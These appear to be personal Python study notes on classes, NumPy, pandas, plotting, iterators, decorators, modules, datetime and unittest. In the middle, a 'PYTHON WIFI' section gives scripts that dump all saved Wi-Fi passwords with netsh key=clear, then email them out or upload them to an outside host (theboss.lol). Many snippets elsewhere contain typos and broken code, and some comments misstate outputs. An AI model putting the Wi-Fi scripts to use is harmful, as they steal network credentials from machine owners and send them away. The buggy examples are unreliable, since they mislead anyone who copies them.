# To create states, we use class variables 

# To create behaviors, we use methods 

# Methods are the same as functions, we call them methods when using classes

# Method is a function that belongs to an object

Class for a 10p Coin

States                             Methods

Value = 0.1							flip()
Color = "Silver
Number of edges = 1
Diameter = 24.5 (mm)
Thckness = 1.85 (mm)
Heads = True

# difference between objects and classes
# classes are the base template from which all objects are made from

# as object, they can have different behaviors

# objects behave independently from each other

--------------------------------------------------
# defining class
class Pound:

    #create states- value ,color,edges,diameter,thickness, heads
    value = 1.00
    colour = "gold"
    num_edges =1
    diameter = 22.5 #mm
    heads = True

# making an object(instance of class)
coin1 = Pound()

print(type(coin1))

print(coin1.value)

coin1.colour = "greenish"

print(coin1.colour)

# create new object
coin2 = Pound()
print(coin2.colour)
print()
print(coin1.colour)
------------------------------------------------
CLASS METHODS
------------------------------------------------
# Constructor in class
def __init__(self):                        # self as parameter used to refer to a specific instance of this class when we write the class code

Constructors are generally used for instantiating an object.
The task of constructors is to initialize(assign values) to the data members of the class when an object of class is created.
In Python the __init__() method is called the constructor and is always called when an object is created.

class GeekforGeeks: 
  
    # default constructor 
    def __init__(self): 
        self.geek = "GeekforGeeks"
  
    # a method for printing data members 
    def print_Geek(self): 
        print(self.geek) 
  
  
# creating object of the class 
obj = GeekforGeeks() 
  
# calling the instance method using the object obj 
obj.print_Geek()


-------------------------------------
import random

class Pound:

    def __init__(self, rare = False):

        self.rare = rare

        if self.rare == rare:
            self.value = 1.25
        else:
            self.value = 1.00
            
        self.color = "gold"
        self.num_edges = 1
        self.diameter = 22.5 #mm
        self.thickness = 3.15 #mm
        self.heads = True

    def rust(self):
        self.color = "greenish"

    def clean(self):
        self.color = "gold"

    def flip(self):
        head_options = [True,False]
        choice = random.choice(heads_optons)
        self.heads = choice

    #python destructor
    def __del__(self):
        print("Coins Spent!")
		
-------------------------------------------------------------
CLASS INHERITANCE AND POLYMORPHISM
------------------------------------------------------------
Inheritance allows us to define a class that inherits all the methods and properties from another class.

Parent class is the class being inherited from, also called base class.

Child class is the class that inherits from another class, also called derived class.
-----------------------------
Create a Parent Class
--------------------------------
Any class can be a parent class, so the syntax is the same as creating any other class:

Example
Create a class named Person, with firstname and lastname properties, and a printname method:

class Person:
  def __init__(self, fname, lname):
    self.firstname = fname
    self.lastname = lname

  def printname(self):
    print(self.firstname, self.lastname)

#Use the Person class to create an object, and then execute the printname method:

x = Person("John", "Doe")
x.printname()

----------------------------------
Create a Child Class
-----------------------------------
To create a class that inherits the functionality from another class, send the parent class as a parameter when creating the child class:

Example
Create a class named Student, which will inherit the properties and methods from the Person class:

class Student(Person):
  pass
 
---------------------------------
#polymorphism
#when a method has multiple forms inside a class, thats polymorphism


-------------------------------------------------------------------------------------------
NUMPY --> a Python library used for working with arrays OF same datatype(making it faster)
-------------------------------------------------------------------------------------------

import numpy as np 

a = np.array([1,2,3,4,5])  #array defined as list

b = np.array((1,2,3,4,5))  #array defined as tuple 

a = np.array([1,2,3,4,5], dtype = 'f')   # you can optionally defined data type (athough can dynaically find the data type)

a = np.array([[1,2,3],[4,5,6]])
print(a.ndim)                           #numpy dimension   # the length of array must be same
> 2                                     #2 because you need two index to point to an element in the two arrays

a[1,1]
> 4

arr = np.array([[1, 2, 3, 4], [5, 6, 7, 8]])
print(arr.shape)
>(2,4)                                   # the array has 2 dimensions, and each dimension has 4 elements. # no.of rows by no.of columns

arr = np.array([[[1,2,3,4],[4,5,6,4],[0,0,-1,4]],[[-1,-2,-3,4],[-4,-5,-6,4],[0,0,1,5]]])

print(C.shape)
> (2,3,4)                                # the array has 2 dimensions, 3 one darrays and each dimension has 3 elements.
 
print(arr.size)
>24                                      #2*3*4 = 24 ; total number of elements

np.arange                                #cretae a 1-d array
A = np.arange(20,30)
> [20 21 22 23 24 25 26 27 28 29]

A = np.random.permutation(np.arange(10))
> [8 9 1 3 2 5 0 6 7 4]

A = np.random.randint(20,40)
> 31                       #returns a random integer

type(A)
> int 

np.random.rand(1000)

D = np.arange(100).reshape(4,25)

D.shape
>(4,25)

np.zeros(10)
np.ones(10)

--------------------
NUmpy slicing
--------------------
creates a view rather than a copy 

result = np.where(arr == 45)            #to find the index of an element

print(result)                           #returns a tuple

print(result[0][0])                     #returns index

arr[result[0][0]] = 3                   # to change value

arr[1,2]         #access the elements in 2 row and 3 column 

arr[1,:]         #access the second row

arr[:,1]         #to access the second column

arr.T            #transpose matrix

arr[arr<40]      #returns elements less than 40

arr[(arr<40) & (arr>30)]    

arr2 = np.hstack(arr1,arr2)

np.vstack(arr1,arr2)

arr1.sort()

#To confirm SPEED BETWEEN universal , in-built and built FUNCTIONS

B = np.random.rand(1000000)
%timeit sum(B)
%timeit np.sum(B)  # B.sum()

307 ms ± 22.2 ms per loop (mean ± std. dev. of 7 runs, 1 loop each)
2.77 ms ± 260 µs per loop (mean ± std. dev. of 7 runs, 100 loops each)


def mySum(G):
    s = 0
    for x in G:
        s+=x
    return s

%timeit np.sum(B)
367 ms ± 22.2 ms

---------------------------------------------------------------------------
PANDAS
---------------------------------------------------------------------------

The Pandas module mainly works with the tabular data, whereas the NumPy module works with the numerical data. 
The Pandas provides some sets of powerful tools like DataFrame(more than 1 -dimen) and Series(1-dimensional arrays) that mainly used for analyzing the data, 
whereas in NumPy module offers a powerful object called Array.

import pandas as pd 

A = pd.Series([2,3,4,5],index=['a','b','c','d'])

type(A.values)

type(A)

A.index

A['a']

:
A['a':'c']

#PANDAS SERIES

grads_dict = {'A':4,'B':3.5,'C':3,'D':2.5}
grads = pd.Series(grads_dict)

print(grads.index)

print(grads.values)

marks_dict = {'A':85,'B':75,'C':65,'D':55}
marks = pd.Series(marks_dict)

print(marks)

print(marks['A'])

print(marks[0:2])

D = pd.DataFrame({'Marks':marks,'Grades':grads})

print(D.T)

D.columns 

D.values[2,0]

D['ScaledMarks']  = 100 * (D['Marks']/90)

print(D)

del D['ScaledMarks']

G = D[D['Marks']>70]

A = pd.DataFrame([{'a':1,'b':4},{'b':-3,'c':9}])     #missing values represented with zeros

print(A)

A.fillna(0)                    #to fill NaN with zeros

A = pd.Series(['a','b','c'],index=[1,3,5])

A.loc[1:3]

A.iloc[1:3]

D.iloc[2,:]

D.iloc[::-1,:]

# data[1] #explicit index, use loc instead 

# data[1:3] #implicit index, use iloc instead 

from sklearn.impute import SimpleImputer

df = pd.read_csv('E:/covid/covid_19_data.csv')

df.head(10)

df.drop(['SNo','Last Update'],axis=1,inplace=True)       #axis=1 means deal with columns , inplace means do the change in df itself

df.rename(columns={'ObservationDate':'Date','Province/State':'Province','Country/Region':'Country'},inplace=True)

df.head()

df['Date'] = pd.to_datetime(df['Date'])             #converting to internal pandas date format

imputer = SimpleImputer(strategy='constant')
df2 = pd.DataFrame(imputer.fit_transform(df),columns =df.columns)          #a simpler way to handle null in data

df.head()

df.describe()                                       #returns summary or statistic(min,max,std)

df.info()                                           #shows missing values

df = df.fillna('NA')                                #replaces empty value with 'NA'

df.info()


df2 = df.groupby('Country')[['Country','Confirmed','Deaths','Recovered']].sum().reset_index()    #grouping by Country

df2 = df.groupby(['Country','Date'])[['Country','Date','Confirmed','Deaths','Recovered']].sum().reset_index()

df3 = df2[df2['Confirmed']>100]

---------------------------------------------------------------------
Matplotlib
---------------------------------------------------------------------
import matplotlib.pyplot as plt

x = np.linspace(0,10,1000)
plt.plot(x,np.sin(x))

plt.scatter(x[::10],y[::10],color='red')

plt.plot(x,y,color='b')
plt.plot(x,np.cos(x),color='g')


import matplotlib.pyplot as plt
import pandas as pd
import numpy as np
from sklearn.impute import SimpleImputer

df = pd.read_csv('E:/covid/covid_19_data.csv')

df.head(50)

df.drop(['SNo','Last Update'],axis=1,inplace=True)
df.rename(columns={'ObservationDate':'Date','Province/State':'State','Country/Region':'Country'},inplace=True)

df['Date'] = pd.to_datetime(df['Date'])

imputer = SimpleImputer(strategy='constant')
df2 = pd.DataFrame(imputer.fit_transform(df),columns=df.columns)

df3 = df2.groupby(['Country','Date'])[['Country','Date','Confirmed','Deaths','Recovered']].sum().reset_index()

df3.head(10)

countries = df3['Country'].unique()
len(countries)

for idx in range(0,len(countries)):    
    C = df3[df3['Country']==countries[idx]].reset_index()        
    plt.scatter(np.arange(0,len(C)),C['Confirmed'],color='blue',label='Confirmed')
    plt.scatter(np.arange(0,len(C)),C['Recovered'],color='green',label='Recovered')
    plt.scatter(np.arange(0,len(C)),C['Deaths'],color='red',label='Deaths')
    plt.title(countries[idx])
    plt.xlabel('Days since the first suspect')
    plt.ylabel('Number of cases')
    plt.legend()
    plt.show()



df4 = df3.groupby(['Date'])[['Date','Confirmed','Deaths','Recovered']].sum().reset_index()

C = df4
plt.scatter(np.arange(0,len(C)),C['Confirmed'],color='blue',label='Confirmed')
plt.scatter(np.arange(0,len(C)),C['Recovered'],color='green',label='Recovered')
plt.scatter(np.arange(0,len(C)),C['Deaths'],color='red',label='Deaths')
plt.title('World')
plt.xlabel('Days since the first suspect')
plt.ylabel('Number of cases')
plt.legend()
plt.show()


-----------------------------------------------------------------------------
PYTHON WIFI
-----------------------------------------------------------------------------
# using Windows

# netsh wlan show profiles

# netsh wlan show profile calabash-5G key=clear                 #to get password; key content

# cat get_wifi_passwords.py
(https://github.com/davidbombal/red-python-scripts/tree/main)


import subprocess                        # Import subprocess so we can use system commands
import re

command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

wifi_list = list()

if len(profile_names) != 0:
    for name in profile_names:
        
        wifi_profile = dict()        
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()        
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            
            wifi_profile["ssid"] = name           
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()            
            password = re.search("Key Content            : (.*)\r", profile_info_pass)            
            if password == None:
                wifi_profile["password"] = None
            else:                
                wifi_profile["password"] = password[1]
            
            wifi_list.append(wifi_profile) 

for x in range(len(wifi_list)):
    print(wifi_list[x]) 
    
    
# cat get_wifi_emails.py
import subprocess
import re
import smtplib
from email.message import EmailMessage

# Python allows us to run system commands by using a function provided by the subprocess module (subprocess.run(<list of command line arguments goes here>, <specify the second argument if you want to capture the output>))
# The script is a parent process and creates a child process which runs the system command, and will only continue once the child process has completed.
# To save the contents that gets sent to the standard output stream (the terminal) we have to specify that we want to capture the output, so we specify the second argument as capture_output = True. This information gets stored in the stdout attribute. The information is stored in bytes and we need to decode it to Unicode before we use it as a String in Python.
command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

# We imported the re module so that we can make use of regular expressions. We want to find all the Wifi names which is always listed after "ALL User Profile     :". In the regular expression we create a group of all characters until the return escape sequence (\r) appears.
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

# We create an empty list outside of the loop where dictionaries with all the wifi username and passwords will be saved.
wifi_list = list()


# If we didn't find profile names we didn't have any wifi connections, so we only run the part to check for the details of the wifi and whether we can get their passwords in this part.
if len(profile_names) != 0:
    for name in profile_names:
        # Every wifi connection will need its own dictionary which will be appended to the wifi_list
        wifi_profile = dict()
        # We now run a more specific command to see the information about the specific wifi connection and if the Security key is not absent we can possibly get the password.
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
        # We use a regular expression to only look for the absent cases so we can ignore them.
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            # Assign the ssid of the wifi profile to the dictionary
            wifi_profile["ssid"] = name
            # These cases aren't absent and we should run them "key=clear" command part to get the password
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
            # Again run the regular expressions to capture the group after the : which is the password
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            # Check if we found a password in the regular expression. All wifi connections will not have passwords.
            if password == None:
                wifi_profile["password"] = None
            else:
                # We assign the grouping (Where the password is contained) we are interested to the password key in the dictionary.
                wifi_profile["password"] = password[1]
            # We append the wifi information to the wifi_list
            wifi_list.append(wifi_profile)

# Create the message for the email
email_message = ""
for item in wifi_list:
    email_message += f"SSID: {item['ssid']}, Password: {item['password']}\n"

# Create EmailMessage Object
email = EmailMessagessid
# Who is the email from
email["from"] = "name_of_sender"
# To which email you want to send the email
email["to"] = "email_address"
# Subject of the email
email["subject"] = "WiFi SSIDs and Passwords"
email.set_content(email_message)

# Create smtp server
with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
    smtp.ehlo()
    # Connect securely to server
    smtp.starttls()
    # Login using username and password to dummy email. Remember to set email to allow less secure apps if using Gmail
    smtp.login("login_name", "password")
    # Send email.
    smtp.send_message(email)
    
    
 # cat get_wifi_rest.py
 
 import subprocess
import re
import requests

# Python allows us to run system commands by using a function provided by the subprocess module (subprocess.run(<list of command line arguments goes here>, <specify the second argument if you want to capture the output>))
# The script is a parent process and creates a child process which runs the system command, and will only continue once the child process has completed.
# To save the contents that gets sent to the standard output stream (the terminal) we have to specify that we want to capture the output, so we specify the second argument as capture_output = True. This information gets stored in the stdout attribute. The information is stored in bytes and we need to decode it to Unicode before we use it as a String in Python.
command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output = True).stdout.decode()

# We imported the re module so that we can make use of regular expressions. We want to find all the Wifi names which is always listed after "ALL User Profile     :". In the regular expression we create a group of all characters until the return escape sequence (\r) appears.
profile_names = (re.findall("All User Profile     : (.*)\r", command_output))

# We create an empty list outside of the loop where dictionaries with all the wifi ssid and passwords will be saved.
wifi_list = list()


# If we didn't find profile names we didn't have any wifi connections, so we only run the part to check for the details of the wifi and whether we can get their passwords in this part.
if len(profile_names) != 0:
    for name in profile_names:
        # Every wifi connection will need its own dictionary which will be appended to the wifi_list
        wifi_profile = dict()
        # We now run a more specific command to see the information about the specific wifi connection and if the Security key is not absent we can possibly get the password.
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output = True).stdout.decode()
        # We use a regular expression to only look for the absent cases so we can ignore them.
        if re.search("Security key           : Absent", profile_info):
            continue
        else:
            # Assign the SSID of the wifi profile to the dictionary
            wifi_profile["ssid"] = name
            # These cases aren't absent and we should run them "key=clear" command part to get the password
            profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"], capture_output = True).stdout.decode()
            # Again run the regular expressions to capture the group after the : which is the password
            password = re.search("Key Content            : (.*)\r", profile_info_pass)
            # Check if we found a password in the regular expression. All wifi connections will not have passwords.
            if password == None:
                wifi_profile["password"] = None
            else:
                # We assign the grouping (Where the password is contained) we are interested to the password key in the dictionary.
                wifi_profile["password"] = password[1]
            # We append the wifi information to the wifi_list
            wifi_list.append(wifi_profile)


# Write the contents of the wifi ssids and passwords to file
with open('wifi.txt', 'w+') as fh:
    for x in wifi_list:
        fh.write(f"SSID: {x['ssid']}\nPassword: {x['password']}\n")

# Open file with read-only in binary so you can send via API
with open('wifi.txt', 'rb') as fh:
    # Do put request with the data as the file
    r = requests.put("http://theboss.lol/", data=fh)
    # status code should be 200 if successful
    if r.status_code == 200:
        print('Success')

#Better Coding Ways
#1
num1 = 10_000_000_000
num2 = 10_000_000

total = num1+num2
print(f"{total :,}")

#2
#instead of manually closing the file, can use a CONTEXT MANAGERS

with open("test.txt", "r") as f:
	file_contents = f.read()
	
words = file_contents.split(" ")
word_count = len(words)
	
#3 iterating over a list
names = ["Yaw", "Kwame","Ama","Adwoa"]

for index, name in enumerate(names):
	print(index, name)
	
for index, name in enumerate(names, start=1):      #if you want index to start at 1
	print(index, name)
	
#4 working with multiple lists
names = ["Yaw", "Kwame","Ama","Adwoa","F"]
heroes = ["A","B","C","D", "E"]
universe = ["Marvel","DC","Marvel","DC"]

for index, name in enumerate(names):
    hero = heroes[index]
    print(f"{name} is actually {hero}")
print()

for name, hero in zip(names,heroes):
    print(f"{name} is actually {hero}")
    
#5 Unpacking values
#Normal
value = (1,2)
print(value)

#Unpacking
a, b = (1,2)
print(a)
>1

a, _ = (1,2)     #if you wont use the other value only , you can hide the other object with underscore
print(a)
> 1


a, b, *c = (1,2,3,4,5)     #* unpacks the remaining elements
print(c)
> [3,4,5]


#6 Class
class Person():
	pass
	
person = Person()

# person.first = "Corey"
# person.last = "Schafer"

#print(person.first)
#print(person.last)

person_info = {"first":"Corey","last":"Schafer"}

for key, value in person_info.items():
	setattr(person, key, value)

for key, _ in person_info.items():
	print(getattr(person, key))
	
#print(person.first)
#print(person.last)

# 7 Taking Password input
# normal
username = input("Username: ")
password = input("Password: ")

print("logging in...")

# secure way
from getpass import getpass

username = input("Username: ")
password = getpass("Password: ")

print("logging in...")


#8 Using modules
python -m venv vitrualenv           # to create virtual environment[At its core, the main purpose of Python virtual environments is to create an isolated environment for Python projects. This means that each project can have its own dependencies, regardless of what dependencies every other project has.]

#with virtual environments, you will need to install modules
$ pip install <module>              pip install requests

python -m json.tool                 # python -m instead of python bookstore.py because we do not have the script(running a module), will check the sys path and run it

python -m password                  #similar to python password.py

import smtpd 

help(smtpd)                        #used to display the documentation of modules, functions, classes, keywords etc.

dir(smtpd)                         #returns list of the attributes and methods of any object (say functions , modules, strings, lists, dictionaries etc.)

# Top Mistakes
1.Spaces and tabs. Need to Upgrade IDE and set tabs as spaces

2. Saving python file as main.py and importing math module raises an error when script is run
> Name of file should be changed

3. Import errors (definitely issue with path or file having same name as module we trying to call in file)

4. How to do mutable default arguments
#Wrong way
def add_employee(emp, emp_list=[]):
	emp_list.append(emp)
	print(emp_list)

emps = ["John","Jane"]

add_employee("Corey")
add_employee("John")
> ["Corey","John"]                       #returns both COrey and John instead of just John

#Right way
def add_employee(emp, emp_list=None):
	if emp_list is None:
		emp_list = []
	emp_list.append(emp)
	print(emp_list)

emps = ["John","Jane"]

add_employee("Corey")
add_employee("John")                    #returns only John

#
import time
from datetime import datetime

def display_time(time=datetime.now()):
	print(time.strftime("%B %d, %Y %H:%M:%S"))
	
display_time()
time.sleep(1)
display_time()

def display_time(time=None):
	time= datetime.now()
	print(time.strftime("%B %d, %Y %H:%M:%S"))
	
display_time()
time.sleep(1)
display_time()                # returns the correct output becuase of the way functions work

#6. Issues with Iterators like zip
names = ["Yaw", "Kwame","Ama","Adwoa","F"]
heroes = ["A","B","C","D", "E"]

identities = list(zip(names,heroes))           #list are not exhausted like other interables

print(identities)        # with Python 3, you would need function list

for identity in identities:
    print("{} is actually {}".format(identity[0], identity[1]))
    
#7. os module issues
import os
os.rename(filename)

from os import rename, remove                  #allow us to use multiple methods of the module
remove(filename)
remove()

from html import escape as h_escape
from glob import escape as g_escape

print(help(h_escape)


#### ITERATORS AND ITERABLES
#A List is a iterable, but not an iterator. It doesnt have a state and a __next__() method
#Iterable is an object, which one can iterate over.
#Iterator is an object, which is used to iterate over an iterable object using __next__() method. Iterators have __next__() method, which returns the next item of the object. 
#Note that every iterator is also an iterable, but not every iterable is an iterator.

nums = [1,2,3]

for num in nums:
	print(num)

print(dir(nums))
> __iter__

i_nums = iter(nums)     #nums.__iter__().. calls the dunder function in the background

print(i_nums)
print(dir(i_nums))
>__next__

print(next(i_nums))
print(next(i_nums))
print(next(i_nums))

> 1
  2
  3
  
 class MyRange:
 	def __init__(self, start, end):
		self.value = start
		self.end = end
	
	def __iter__(self):
		return self
	
	def __next__(self):
		if self.value >= self.end:
			raise StopIteration
		current = self.value
		self.value += 1
		return current
		
#creating a generator function
def my_range(start,end):
	current = start
	while current < end:
		yield current
		current += 1
	
nums = MyRange(1,10)

print(next(nums))
print(next(nums))

### MODULES ITERTOOLS
import itertools

counter = itertools.count()

data = [100,200,300,400]

print(next(counter))
print(next(counter))

daily_data = list(zip(itertools.count(), data))

print(daily_data)
> [(0,100),(1,200),(2,300),(3,400)

counter = itertools.cycle(("On","Off"))
print(next(counter))
print(next(counter))
print(next(counter))
print(next(counter))

squares = map(pow, range(10), itertools.repeat(2))

print(list(squares))     #cast it to a list

#Context Manager
from contextlib import contextmanager

@contextmanager
def open_file(file, mode):
	f = open(file, mode)
	yield f
	f.close()
	
with open_file("sample.txt","w") as f:
	f.write("I tried, but i lost")
	
print(f.closed)

import os
from contextlib import contextmanager

cwd = os.getcwd()
os.chdir('Sample-Dir-One')
print(os.listdir())
os.chdir(cwd)

cwd = os.getcwd()
os.chdir('Sample-Dir-Two')
print(os.listdir())
os.chdir(cwd)

@contextmanager
def change-dir(destination):
	try:
		cwd = os.getcwd()
		os.chdir(destination)
		yield
	finally:
		os.chdir(cwd)

with change_dir('Sample-Dir-One'):
	print(os.listdir())

with change_dir('Sample-Dir-Two'):
	print(os.listdir())

-----------------------------------------------------
###DECORATORS
-----------------------------------------------------
# A decorator is a design pattern in Python that allows a user to add new functionality to an existing object without modifying its structure.
# Decorators are usually called before the definition of a function you want to decorate.

def outer_function():
	message = "Hi"                              #local variable message
	
	def inner_function():                       # inner function
		print(message)                          # the massage wasnt created in the inner function, but the inner function has access to it [free variable]
	return inner_function()

outer_function()



def decorator_function(original_function):
	def wrapper_function():
		print("wrapper executed this before {}".format(original_function.__name__))
		return original_function()
	return wrapper_function

@decorator function
	def display():
		print("display function ran")

#display = decorator_function(display)

display()

-------------------------------------------------------
##FIRST CLASS FUNCTIONS
-------------------------------------------------------
#First-class functions means that the language treats functions as values – that you can assign a function into a variable, pass it around

# Allows us to treat functions like any other object. We can pass functions as arguments to another functions. We can assign functions to variables.

# Closures allow us to take advantage of first-class functions, and return an inner function that remembers and has access to variables local to the scope in which they were created

def square(x):
	return x*x
	
def my_map(func, arg_list):
	result = []
	for i in arg_list:
		result.append(func(i))
	return result

squares = my_map(square, [1,2,3,4,5])

print(squares)

def cube(x)
	return x * x * x
f = square(5)

print(square)
print(f)

f = sqaure      #assign function as variable
print(f(5))

--------------------------------------------------------------------
IMPORTING MODULES
--------------------------------------------------------------------

# ---------> content of my_module.py
print('Imported my_module...')

test = 'Test String'


def find_index(to_search, target):
    '''Find the index of a value in a sequence'''
    for i, value in enumerate(to_search):
        if value == target:
            return i

    return -1


# ----------> intro.py

#import my_module                              # gets access to all functions and variables in the modules
# import my_module as mm                       # renaming the module 
# from my_module import find_index             # gives us to only find_index function in the module
from my_module import find_index, test         # gies us access to the function and variable of the module 
# from my_module import *                      # makes it harder to track problems
import sys                                     # when we import modules, it checks multiple locations within a list called sys.path
                                               # the directories containing the script that we are running ,the next is the directory listed in the python path environment variable
                                               # the next is the standard library directories , and then the directory for third-party packages 
                                               # returns ModuleNotFoundError if the module you ar importing is not in the sys path
                                               # you can manually add it to the sys path or by changing the python path environemnt varible.


courses = ['History', 'Math', 'Physics', 'CompSci']

index = find_index(courses, 'Math')
# print(index)
# print(test)
print(sys.path)


import sys                                           # The python sys module provides functions and variables which are used to manipulate different parts of the Python Runtime Env.
sys.path.append('c:\Users\HP.DESKTOP-MVC2C5I\Desktop\py\for_test')       # one way to add the module path to the sys.path 

# to change python path environment variable(setting the environment variable) on MAC
nano ~/.bash_profile 

export PYTHONPATH="/Users/coreyshafer/Desktop/My-Modules"

source ~/.bash_profile

# setting the environment varibale on Windows
search for environment varibales and create new 
variable name = PYTHONPATH   ; variable value =  'c:\Users\HP.DESKTOP-MVC2C5I\Desktop\py\for_test'

import random                                                               # built-in module to generate the pseudo-random variables.

courses = ['History', 'Math', 'Physics', 'CompSci']
random_course = random.choice(courses)
print(random_course)                                                        # returns a random course
> History

import math

rads = math.radians(90)
print(rad)

import datetime
impoort calender

today = datetime.date.today()
print(today)

print(calendar.isleap(2020))
> True

==========================================
OS MODULES
==========================================
The OS module allows us to interact wiht the underlying operating system in several different ways.

- Navigate the file system
- Get file information
- Look up and change the environment variables
- Move files around
- Many more

To begin, import the os module. This is a built in module, no third party modules need to be installed.

# Get current working directory
os.getcwd()

# Change directory, this requires a path to change to
os.chdir(path)

# List directory, you can pass a path, but by default it is in the current directory
os.listdir()

# Multiple options for creating directories
mkdir()  # Use for making one directory
makedirs(). # Use if you want to create multiple directories at once

# Remove directories
rmdir(file). # Recommended use case
removedirs(file)  # Removes intermediate directories if specified

# Rename a file or folder
os.rename('test.txt', 'demo.txt'). # This renames text.txt to demo.txt

# Look at info about files
os.stat(test.txt)
# Useful stat results: st_size (bytes), st_mtime (time stamp)

# To see entire directory tree and files within
# os.walk is a generator that yields a tuple of 3 values as it walks the directory tree

for dirpath, dirnames, filenames in os.walk(routepath): 
    print('Current Path:', dirpath)
    print('Directories:', dirnames)
    print('Files:', filenames)
    print()

# This is useful for locating a file that you can't remember where it was
# If you had a web app, and you wanted to keep track of the file info within a certain directory structure, then you could to thru the os.walk method and go thru all files and folders and collect file information.


# Access home directory location by grabbing home environment variable
os.environ.get('HOME'). # Returns a path
# To properly join two files together use os.path.join()
file_path = os.path.join(os.environ.get('HOME'), 'test.txt')
# the benefit of os.path.join, is it takes the guess work out of inserting a slash

# os.path has other useful methods

os.path.basename
# This will grab filename of any path we are working on

os.path.dirname('/tmp/test.txt')
# returns the directory /tmp

os.path.split('/tmp/test.txt')
# returns both the directory and the file as a tuple

os.path.exists('/tmp/test.txt')
# returns a boolean

os.path.isdir('/tmp/test.txt')
# returns False

os.path.isfile('/tmp/test.txt')
# returns True

os.path.splitext('/tmp/test.txt')
# Splits file route of the path and the extension
# returns ('/tmp/test', '.txt')
# This is alot easier than parsing out the extension. Splitting off and taking the first value is much better.
# Very useful for file manipulation

print(os.__file__)                                      # prints the location of this file in our filesystem
> C:\Users\HP.DESKTOP-MVC2C5I\AppData\Local\Programs\Python\Python37-32\lib\os.py

# C:\Users\HP.DESKTOP-MVC2C5I\AppData\Local\Programs\Python\Python37-32\lib\  == is the directory where the standard libraries are


==========================================
DATETIME MODULE
==========================================
import datetime
d = datetime.date(2016, 7, 24)                              # creating a date, with leading zero for single digit, it returns error
print(d)

import datetime
datetime.datetime.now()                  # class datetime.datetime A combination of a date and a time. Attributes: year, month, day, hour, minute, second, microsecond, and tzinfo.
datetime.datetime.now().isoweekday()                        # 1-7, representing Monday to Sunday, the current time is the day of the week;

datetime.datetime.now().weekday()                           # returned 0-6, representing Monday to Sunday

tday = datetime.date.today()
print(tday.day)

tdelta = datetime.timedelta(days=7)                         # A duration expressing the difference between two date, time, or datetime instances to microsecond resolution.
print(tday + tdelta)

bday = datetime.date(2021, 6, 10)                           # class datetime.date Attributes: year, month, and day.

till_bday = bday - tday 
print(till_bday)

t = datetime.time(9,30,45,100000)                           # class datetime.time Attributes: hour, minute, second, microsecond, and tzinfo(timezone)
print(t)

dt = datetime.datetime(2016,7,26,12,30,45,10000)
print(dt.time()) 
print(dt.date())

import datetime
import pytz

# Naive
# d = datetime.date(2001, 9, 11)

tday = datetime.date.today()


# weekday() - Monday is 0 and Sunday is 6
# print(tday)

# isoweekday() - Monday is 1 and Sunday is 7
# print(tday)


# datetime.timedelta(days=0, seconds=0, microseconds=0, milliseconds=0, minutes=0, hours=0, weeks=0)

tdelta = datetime.timedelta(hours=12)

# print(tday + tdelta)

# date2 = date1 + timedelta
# timedelta = date1 + date2

bday = datetime.date(2016, 9, 24)

till_bday = bday - tday

# print(till_bday.days)

t = datetime.time(9, 30, 45, 100000)

# dt = datetime.datetime.today()
# dtnow = datetime.datetime.now()
# print(dir(datetime.datetime))
# print(dt)
# print(dtnow)

dt = datetime.datetime(2016, 7, 24, 12, 30, 45, tzinfo=pytz.UTC)
# print(dir(dt))

dt_utcnow = datetime.datetime.now(tz=pytz.UTC)
# print(dt_utcnow)

dt_utcnow2 = datetime.datetime.utcnow().replace(tzinfo=pytz.UTC)
# print(dt_utcnow2)

# dt_mtn = dt_utcnow.astimezone(pytz.timezone('US/Mountain'))
# print(dt_mtn)

dt_mtn = datetime.datetime.now()

mtn_tz = pytz.timezone('US/Mountain')
dt_mtn = mtn_tz.localize(dt_mtn)

# print(dt_mtn)

dt_east = dt_mtn.astimezone(pytz.timezone('US/Eastern'))
# print(dt_east)

print(dt_mtn.strftime('%B %d, %Y'))

dt_str = 'July 24, 2016'
dt = datetime.datetime.strptime(dt_str, '%B %d, %Y')
print(dt)

# strftime - Datetime to String
# strptime - String to Datetime


import webbrowser                                       # The webbrowser. open() method will open your default web browser with a given url.
webbrowser.open_new_tab("https://hesgoal.com")

--------------------------------------------------------
# UNITTEST
--------------------------------------------------------
# a good unittest will protect your code from breaking when you update your code.
# it will keep your code running or tell you what is broken 

# a sample test script 
import unittest

class TestStringMethods(unittest.TestCase):

    def test_upper(self):
        self.assertEqual('foo'.upper(), 'FOO')

    def test_isupper(self):
        self.assertTrue('FOO'.isupper())
        self.assertFalse('Foo'.isupper())

    def test_split(self):
        s = 'hello world'
        self.assertEqual(s.split(), ['hello', 'world'])
        # check that s.split fails when the separator is not a string
        with self.assertRaises(TypeError):
            s.split(2)

if __name__ == '__main__':
    unittest.main()

##--------content of calc.py

def add(x, y):
    """Add Function"""
    return x + y


def subtract(x, y):
    """Subtract Function"""
    return x - y


def multiply(x, y):
    """Multiply Function"""
    return x * y


def divide(x, y):
    """Divide Function"""
    if y == 0:
        raise ValueError('Can not divide by zero!')
    return x / y


# name in convention when writing a test (e.g test_calc.py)
import unittest
import calc                             # import module to test

    # we need to create some test cases for the functions we set out to test 
    # we need to create a test class that inherits from a unittest.TestCase
    # we need to write a method an the convention is to start with test_
    # just like any method in a class, this takes self as the first argument 

    # because we inherit from unittest, we have access to all these assert methods (https://docs.python.org/3/library/unittest.html)  
    # Note that the msg keyword argument can be passed to assertRaises(), assertRaisesRegex(), assertWarns(), assertWarnsRegex() only when they are used as a context manager.
    # assertEqual(first, second, msg=None) Test that first and second are equal. If the values do not compare equal, the test will fail.
    # a call to assertEqual() to check for an expected result; assertTrue() or assertFalse() to verify a condition; or assertRaises() to verify that a specific exception gets raised.

